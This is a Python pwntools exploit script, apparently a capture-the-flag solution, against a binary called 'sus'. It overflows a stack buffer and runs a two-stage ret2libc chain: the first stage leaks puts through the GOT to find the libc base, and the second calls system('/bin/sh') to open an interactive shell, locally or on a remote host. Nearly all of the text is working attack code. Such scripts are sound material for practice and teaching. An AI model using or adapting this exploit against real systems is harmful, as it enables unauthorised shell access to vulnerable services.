from pwn import *
import sys

context.terminal = "kitty"
context.gdbinit = "/opt/pwndbg/gdbinit"
context.log_level = "info"        # 'DEBUG', 'ERROR', 'INFO', 'NOTSET', 'WARN', 'WARNING'
binary = "./sus"        ### CHANGE ME !!!!!!!!!!!!!!!!

gdbscript = '''
    b *main+81
'''
def init():
    ## loading custom libc
    # env = {"LD_PRELOAD": "./desired_libc"}
    ## loading custom libc
    if (args.GDB):
        pp = gdb.debug(binary, gdbscript=gdbscript)
    elif (args.REMOTE):
        pp = remote(sys.argv[1], int(sys.argv[2]))
    else :
        pp = process(binary)# env=env)
    return pp

def findip(pp, length):
    cyclic_patt = cyclic(length)
    pp.recv()
    pp.sendline(cyclic_patt)
    pp.wait()
    # offset = cyclic_find(pp.core.pc)
    offset = cyclic_find(pp.corefile.read(pp.core.sp, 4))
    log.info(f"offset found {offset}")

def exploit():
    offset = 72
    # 56 is the gadget
    log.info("binary loaded")
    pp.recvuntil(b"?")
    payload = flat(
        cyclic(56),
        elf.got.puts,
        0,
        elf.plt.puts,
        elf.sym.main
            )
    pp.sendline(payload)
    putsraw = pp.recvuntil(b"sus?").replace(b"sus?", b"").rstrip()[1::]
    libc.address = u64(putsraw + ( (8 - len(putsraw) )* b"\x00" )) - libc.sym.puts
    log.info(f"fucking puts address {hex(libc.address)}")
    binsh = next(libc.search(b"/bin/sh\x00"))
    ret = 0x0000000000401016
    payload = flat(
        cyclic(56),
        binsh,
        0,
        ret,
        libc.sym.system
            )
    pp.sendline(payload)
    pp.interactive()

if (args.REMOTE):
    libc = ELF("./libc.so.6")
else:
    libc = ELF("/usr/lib/libc.so.6")
libcrops = ROP(libc)
elf = context.binary = ELF(binary)
pp = init()
exploit()
